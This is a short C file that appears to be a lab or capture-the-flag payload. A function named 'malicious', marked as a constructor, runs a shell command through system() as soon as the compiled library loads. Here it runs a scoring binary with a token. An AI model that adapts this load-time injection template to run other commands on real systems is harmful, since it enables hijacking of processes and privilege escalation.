#include<stdio.h>
	#include<stdlib.h>
	 
	static void malicious() __attribute__((constructor));
	 
	void malicious() {
	    system("/usr/local/bin/score c029f8a1-9095-4789-bef6-ccaf91dea4ae");
	}
